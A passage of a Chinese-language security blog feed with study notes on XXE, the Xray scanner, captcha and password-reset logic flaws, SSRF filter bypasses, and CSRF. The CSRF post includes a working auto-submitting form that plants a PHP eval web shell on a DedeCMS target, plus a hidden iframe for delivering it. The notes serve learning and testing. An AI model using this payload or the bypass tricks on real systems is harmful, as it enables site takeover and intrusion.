id="2、看到数据包莫名其妙传递、返回XML代码-可以试试XXE"><a href="#2、看到数据包莫名其妙传递、返回XML代码-可以试试XXE" class="headerlink" title="2、看到数据包莫名其妙传递、返回XML代码,可以试试XXE"></a>2、看到数据包莫名其妙传递、返回XML代码,可以试试XXE</h2><h1 id="修复XXE的方法"><a href="#修复XXE的方法" class="headerlink" title="修复XXE的方法"></a>修复XXE的方法</h1><p>​    1、libxml_disable_entity_loader(true);  PHP的函数（禁止加载XML实体）<br>​    2、过滤SYSTEM关键字</p>]]></content>
    
    
    <summary type="html">XXE定义, 如何寻找XXE</summary>
    
    
    
    <category term="XXE实体注入" scheme="https://dtxharry.github.io/categories/XXE%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="XXE" scheme="https://dtxharry.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>自动化漏扫xray</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%89%ABxray/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%89%ABxray/</id>
    <published>2023-08-21T08:41:49.000Z</published>
    <updated>2023-08-21T14:59:36.051Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞扫描工具"><a href="#漏洞扫描工具" class="headerlink" title="漏洞扫描工具"></a>漏洞扫描工具</h1><p>自动化检测漏洞的工具 :AWVS | Xray | Nessus | appscan | Goby</p><p>X-ray不开源,下载地址：<a href="https://github.com/chaitin/xray/releases">https://github.com/chaitin/xray/releases</a><br>                    使用文档：<a href="https://docs.xray.cool/#/tutorial/introduce">https://docs.xray.cool/#/tutorial/introduce</a></p><p>优点：<br>        1、省时省力<br>        2、人测试会容易有遗失，工具辅助一下，测试的会更全面</p><p>缺点:<br>        1、容易出事<br>        2、容易误伤<br>        3、可能效果不佳、检测出来漏洞都过于典型和明显<br>        4、漏扫会给出一些莫名其妙的漏洞</p><p>不知道他到底干了什么, 我手上有个1000条语句，可以测试200种漏洞。全部糊上去试试，看返回结果（野）,容易把目标搞瘫痪,比如后台有xss,误伤是因为类似爬虫,爬到目标网页的其他外链,就会误伤别的网站(政府网站那不就废了吗),而且可能效果不佳、检测出来漏洞都过于典型和明显</p><h1 id="X-ray的命令"><a href="#X-ray的命令" class="headerlink" title="X-ray的命令"></a>X-ray的命令</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ws(webscan的缩写) </span><br><span class="line">--url 指定当前页面扫描(不会扩展)  http://testphp.vulnweb.com </span><br><span class="line">--url &quot;http://testphp.vulnweb.com/&quot;</span><br><span class="line">--basic-crawler 模拟用户爬虫测试</span><br><span class="line">--html-output 1.html 网页格式</span><br><span class="line"> --text 文本格式</span><br><span class="line">--json json格式</span><br></pre></td></tr></table></figure><h1 id="漏扫扫描方式："><a href="#漏扫扫描方式：" class="headerlink" title="漏扫扫描方式："></a>漏扫扫描方式：</h1><p>​        1、主动扫描<br>​            你给漏扫目标，让他去测试。<br>​        2、被动扫描<br>​            我不给他目标，让他自己去测。我把我浏览器的数据包给他，他根据我的数据包逐一测试</p><p>1、安装浏览器代理插件foxyproxy，SwitchyOmega等都行</p><p>2、启动Xray，生成ca证书命令：xray_windows_amd64.exe genca</p><p>3、安装证书并信任（只装一次就可）浏览器安装证书的方法有所查别，具体可参考Xray的使用文档（Firefox 浏览器只能在浏览器内导入证书）</p><p>4、运行Xray，开启监听命令：xray_windows_amd64.exe webscan —listen 127.0.0.1:7777 —html-output test.html5、浏览器启用代理，端口与 Xray 一致</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray_windows_amd64.exe webscan --listen 127.0.0.1:8888 --html-output listen.html</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">介绍一款漏扫工具</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透工具" scheme="https://dtxharry.github.io/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
    <category term="扫描" scheme="https://dtxharry.github.io/tags/%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>验证码绕过,密码找回</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E/</id>
    <published>2023-08-21T08:37:26.000Z</published>
    <updated>2023-08-21T14:43:43.418Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><p>产生的问题是逻辑而不是代码问题(工具扫不出来的),只能手工测试,比如:越权漏洞,验证码绕过,支付漏洞,密码找回漏洞</p><h1 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过:"></a>验证码绕过:</h1><h2 id="验证码的目的"><a href="#验证码的目的" class="headerlink" title="验证码的目的:"></a>验证码的目的:</h2><p>全自动区分计算机和人类的图灵测试（现在已经不单纯了）.以前是完全为了防止被爆破、灌水内容、垃圾注册、恶意登录、刷票、撞库、活动作弊、垃圾广告、爬虫、羊毛党等,现在还有一个方便用户无账号密码登录的验证身份的作用(短信\邮箱验证码（知道微信、支付宝、美团密码）：通过持有手机号来证明你的身份权限)</p><h2 id="代码逻辑错误"><a href="#代码逻辑错误" class="headerlink" title="代码逻辑错误"></a>代码逻辑错误</h2><p>1、前端验证验证码：验证码在浏览器验证, 可以禁用JS，修改JS的数据包[任何的前端检测都是没有检测]<a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0114577">http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0114577</a></p><p>2、验证码设置了但是并没有校验，乱输验证码也能够成功的登录[找XSS平台]</p><p>3、验证码可以重复使用[拿着对的验证码不断的去尝试替换数据包信息]</p><p>4、验证码空值绕过 [常见情况下，多次输入才有验证码。if有验证码传参、没有传参我们就不验证] HTTP无状态、无连接（IP/Cookie）</p><p>5、脚本识别(验证码爆破工具PKAV/Python脚本)</p><p>6、验证码会在HTML页面输出(简单爬虫)<br>      <a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0146767">http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0146767</a></p><p>7、验证码可控制(开关型的字符,传参出现True\False  出现Yes\No 出现 1\0 要注意 这些东西一般都是开关),或者有的验证码的发送和目标的手机号没有绑定;<a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-086716">http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-086716</a></p><p>8、验证码有规则 (你能推算出下个验证码是什么[时间戳:计算机讲究把一切都变数字，用数字来代替时间以格林威治时间1970年01月01日00时00分00秒为开始,  <a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a>    ])</p><p>9、万能验证码(一个特殊验证码，用了就不检验 [设备上有、网站不常见]) 万能账户、密码</p><p>10、验证码有的时候会藏在cookie里面,分析一下是不是存在验证码的参数 (a=xy1ty)</p><p>11、图片验证码，类型太少</p><p>12.多次登录后才出现验证码绕过：<br>            基于session：<a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0114450">http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0114450</a><br>            基于ip: <a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-080327">http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-080327</a><br>            [任何基于IP的东西都可以先试试XFF (X-Forwarded-For)]</p><p>13.直接修改密码页面（直接访问修改密码的页面，就直接修改密码（逻辑缺失））<a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-040908">http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-040908</a></p><p>14.越权漏洞—&gt;自己验证码通过改包然后修改他们密码<br><a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0102205">http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0102205</a><br><a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-016896">http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-016896</a></p><h1 id="密码找回漏洞"><a href="#密码找回漏洞" class="headerlink" title="密码找回漏洞"></a>密码找回漏洞</h1><p>在注册之前，通过预先设定一个密保问题，忘记密码时，通过此密保进行认证，认证成功进入密码修改页面;  </p><p>密保问题可能容易直接被猜测  （比如很多学校的知道学号和身份证号码就可以重置校园通的密码）</p><p>密保问题答案页面中显示（数据包里面可能自带了密保答案，可能在JS里面）</p>]]></content>
    
    
    <summary type="html">简单的一些逻辑漏洞</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="逻辑漏洞" scheme="https://dtxharry.github.io/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>SSRF-服务器请求伪造攻击</title>
    <link href="https://dtxharry.github.io/2023/08/21/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/"/>
    <id>https://dtxharry.github.io/2023/08/21/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/</id>
    <published>2023-08-21T08:36:26.000Z</published>
    <updated>2023-08-21T14:47:17.108Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSRF定义"><a href="#SSRF定义" class="headerlink" title="SSRF定义"></a>SSRF定义</h1><p>服务器端请求伪造（SSRF）是指攻击者能够从易受攻击的Web应用程序发送精心设计的请求的对其他网站进行攻击。(利用一个可发起网络请求的服务当作跳板来攻击其他服务)<br>攻击者能够利用目标帮助攻击者访问其他想要攻击的目标,即A让B帮忙访问C</p><p>典型的SSRF: 我们传参然后对方服务器去访问</p><h2 id="与CSRF的区别"><a href="#与CSRF的区别" class="headerlink" title="与CSRF的区别"></a>与CSRF的区别</h2><p>CSRF(跨站/客户端请求伪造) =&gt; 浏览器因为Js偷偷的发送数据包</p><p>SSRF(服务器端请求伪造) =&gt; 服务器因为你的传参偷偷发送数据包</p><p>翻译网页 =&gt;<code>http://web.yeekit.com/</code> <code>http://fanyi.youdao.com</code><br>翻译单词 =&gt; POST/GET 传参去 数据库查询<br>翻译页面 =&gt; 翻译网站直接替代我们去访问那个目标站点，然后获得内容后查询英文对应，然后处理完返回给我们</p><h1 id="SSRF的危害"><a href="#SSRF的危害" class="headerlink" title="SSRF的危害"></a>SSRF的危害</h1><p>1、[核心目的] 访问内网(外紧内松)  （要能访问内网,能访问本机）,即穿越防火墙的通行证<br>2、隐藏攻击者（当做跳板机来躲避追踪）<br>3、攻击目标本机（dict://可以探测端口   ;    file://协议可以读取文件,例如数据库的账户密码）<br>    （有些网站对127.0.0.1的访问是不设防的）<br>      WAF（不会拦截你的SSRF攻击）</p><p>dict://协议的使用 : <code>XXXX.php?url=dict://127.0.0.1:80</code></p><p>file://协议的使用 :  file:///F:/p_h_p/A_A_A/1.txt<br>                              <strong>要注意,如果例如.php文件显示不出来,可能是被浏览器和谐掉了,可以查看网页源码查看</strong></p><p>SSRF还可以与存储型XSS联动做一个反射型XSS,例如靶场留言板弹cookie</p><h1 id="如何判断是否存在SSRF"><a href="#如何判断是否存在SSRF" class="headerlink" title="如何判断是否存在SSRF"></a>如何判断是否存在SSRF</h1><p>在实战中,只要确定那个传参传进去的网站被对方服务器访问了就可能存在,所以可以利用DNSlog平台进行判定<code>dnslog.cn</code>   </p><p>要注意, dnslog 只能针对有外网的服务器, 实战中不能忽视无外网的服务器, 可以进行内网ip的强扫</p><p>项目上只要能发起请求就算漏洞(网站功能除外),但SRC需要可以访问内网和本机</p><h1 id="域名-端口-与-内网ip-端口-的区别"><a href="#域名-端口-与-内网ip-端口-的区别" class="headerlink" title="域名:端口    与   内网ip:端口  的区别"></a><strong>域名:端口</strong>    与   <strong>内网ip:端口</strong>  的区别</h1><p><code>127.0.0.1:81</code> 当前存在SSRF漏洞的主机的81端口</p><p> 域名:81  这个域名对应ip的81端口</p><p>​    ip (公网ip) =&gt; 内网可能有10个主机</p><h1 id="绕过SSRF防护的一些手法"><a href="#绕过SSRF防护的一些手法" class="headerlink" title="绕过SSRF防护的一些手法"></a>绕过SSRF防护的一些手法</h1><p>不能访问内网时,可以尝试以下操作</p><p>1、<code>http://www.baidu.com@127.0.0.1</code><br>2、纯数字ip地址：<br>                    <code>http://www.baidu.com</code><br>                    <code>http://112.80.248.73</code><br>                    <code>http://1884354633</code><br>                    <code>http://0016024174111</code><br>                    <code>http://0x7050f849</code></p><h1 id="扩展内容（不要求掌握-）"><a href="#扩展内容（不要求掌握-）" class="headerlink" title="扩展内容（不要求掌握 ）"></a>扩展内容（不要求掌握 ）</h1><h2 id="gopher协议：-可以发起TCP数据流"><a href="#gopher协议：-可以发起TCP数据流" class="headerlink" title="gopher协议： 可以发起TCP数据流"></a>gopher协议： 可以发起TCP数据流</h2><p>​    TCP: 有连接状态的东西<br>​    UDP: 漂流瓶联系（我就发送数据，不管你收到没）</p><h2 id="redis未授权访问（SSRF攻击的东西）"><a href="#redis未授权访问（SSRF攻击的东西）" class="headerlink" title="redis未授权访问（SSRF攻击的东西）"></a>redis未授权访问（SSRF攻击的东西）</h2><p>​    redis 缓存数据库（默认没有密码 外网访问不到）</p>]]></content>
    
    
    <summary type="html">服务器端请求伪造的定义与绕过防护的手法</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="SSRF" scheme="https://dtxharry.github.io/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>CSRF-跨站请求伪造攻击</title>
    <link href="https://dtxharry.github.io/2023/08/21/CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/"/>
    <id>https://dtxharry.github.io/2023/08/21/CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/</id>
    <published>2023-08-21T08:35:32.000Z</published>
    <updated>2023-08-21T14:39:25.927Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSRF定义"><a href="#CSRF定义" class="headerlink" title="CSRF定义"></a>CSRF定义</h1><p>CSRF（Cross-site request forgery）<br>跨站请求伪造：也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。<br>尽管听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。<br>其实说白了，csrf漏洞的成因就是网站的cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个都网站，会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的csrf脚本或包含csrf脚本的链接，可能会执行一些用户不想做的功能（比如是添加账号等）  </p><p>浏览器在你不知情的情况下偷偷的发送了数据包  （安全的本质就是信任）<br>你主动访问的某个站点，代表你信任那个站点</p><p> js(可以发送数据包) ajax阿贾克斯异步传输</p><p><strong>任何的网站功能,本质上就是数据包的传递</strong></p><h1 id="CSRF实现的条件"><a href="#CSRF实现的条件" class="headerlink" title="CSRF实现的条件"></a>CSRF实现的条件</h1><p>1、存在CSRF漏洞<br>2、黑客要自己做一个貌似合理的页面骗受害者来点击<br>         你设置的网页，他是有指向性的,只能指定构造指定ip的数据包 （百度、QQ存在CSRF的话很危险）<br>3、目标登录过这个网站或者这个网站的权限没有掉(例如一次会话内)</p><h1 id="CSRF的防治"><a href="#CSRF的防治" class="headerlink" title="CSRF的防治"></a>CSRF的防治</h1><h2 id="1-无痕浏览-隐私模式"><a href="#1-无痕浏览-隐私模式" class="headerlink" title="1.无痕浏览,隐私模式"></a>1.无痕浏览,隐私模式</h2><p>其中,要注意这不是无敌的,我们要知道无痕的逻辑<br>(1)不会留下历史记录<br>(2)和正常模式隔离<br>        这意味着,隐私模式中登录了网站还是会产生有权限的cookie,且第二个隐私模式的窗口依然会继承这些cookie进行免登录.</p><h2 id="2-Token-唯一解"><a href="#2-Token-唯一解" class="headerlink" title="2.Token (唯一解)"></a>2.Token (唯一解)</h2><p>Token   :   Cookie里面有一段随机值，和请求包里面的GET或者POST传参有一个关联</p><p>没有Token就可能有CSRF </p><h1 id="CSRF的判定"><a href="#CSRF的判定" class="headerlink" title="CSRF的判定"></a>CSRF的判定</h1><p>找一个站，登录A用户，修改自己的账号密码,  然后把数据包做成CSRF<br>换个浏览器，登录B,  点击做好的CSRF，只要能修改就是了</p><h1 id="如何将数据包做成CSRF"><a href="#如何将数据包做成CSRF" class="headerlink" title="如何将数据包做成CSRF"></a>如何将数据包做成CSRF</h1><p>burp抓到包后右键找到engagement tools下的Generate CSRF PoC,即可保存这个html.</p><p>但是此时burp生成的是有一个按钮要真的点击才能发包的,真实情况下需要设置成自动发包,此时需要加一个js代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&#x27;aaa&#x27;</span> <span class="attr">action</span>=<span class="string">&quot;http://59.63.200.79:8010/newcsrf/dede/file_manage_control.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fmdo&quot;</span> <span class="attr">value</span>=<span class="string">&quot;edit&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;backurl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;activepath&quot;</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;#47;</span>newcsrf<span class="symbol">&amp;#47;</span>uploads&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;filename&quot;</span> <span class="attr">value</span>=<span class="string">&quot;777<span class="symbol">&amp;#46;</span>php&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;lt;</span><span class="symbol">&amp;#63;</span>php<span class="symbol">&amp;#32;</span><span class="symbol">&amp;#64;</span>eval<span class="symbol">&amp;#40;</span><span class="symbol">&amp;#36;</span><span class="symbol">&amp;#95;</span>REQUEST<span class="symbol">&amp;#91;</span>8<span class="symbol">&amp;#93;</span><span class="symbol">&amp;#41;</span><span class="symbol">&amp;#63;</span><span class="symbol">&amp;gt;</span>&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;B1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span>�<span class="symbol">&amp;#191;</span><span class="symbol">&amp;#157;</span><span class="symbol">&amp;#32;</span>�<span class="symbol">&amp;#173;</span><span class="symbol">&amp;#152;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span>&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;aaa&#x27;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.其中<code>&lt;form&gt;</code>标签加入id=’XXX’属性, 与下面的document.getElementById(‘XXX’).submit()对应就好</p><p>2.action=”<a href="http://59.63.200.79:8010/newcsrf/dede/file_manage_control.php">http://59.63.200.79:8010/newcsrf/dede/file_manage_control.php</a>“ 中的域名和文件也要事先做好确认,因为是cms所以很好确定域名(社工)和路径(基本一致),这个文件存在的话就可以下一步了</p><p>3.<code>&lt;input type=&quot;hidden&quot; name=&quot;activepath&quot; value=&quot;&amp;#47;newcsrf&amp;#47;uploads&quot; /&gt;</code>这里的路径也要测试是否更改</p><h1 id="总结-构造CSRF的基本流程"><a href="#总结-构造CSRF的基本流程" class="headerlink" title="总结:构造CSRF的基本流程"></a>总结:构造CSRF的基本流程</h1><p>1.CMS发现CSRF漏洞<br>2.本地构建出来<br>3.构建一个新的页面,将恶意的带着CSRF的html塞进去<br>4.让目标访问</p><h2 id="如何把html塞进去"><a href="#如何把html塞进去" class="headerlink" title="如何把html塞进去"></a>如何把html塞进去</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://59.63.200.79:8003/&quot; width=&quot;0&quot; height=&quot;0&quot;/&gt;</span><br></pre></td></tr></table></figure><p>iframe是内联框架的意思,有这个内联的页面会进行两次请求,第一次是页面本身,第二次是嵌套的这个页面,因为长宽高设置为0所以放在最后很难被察觉</p>]]></content>
    
    
    <summary type="html">简单讲解跨站请求伪造的构造以及如何防范</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="csrf" scheme="https://dtxharry.github.io/tags/csrf/"/>
    
  </entry>
  
</feed>
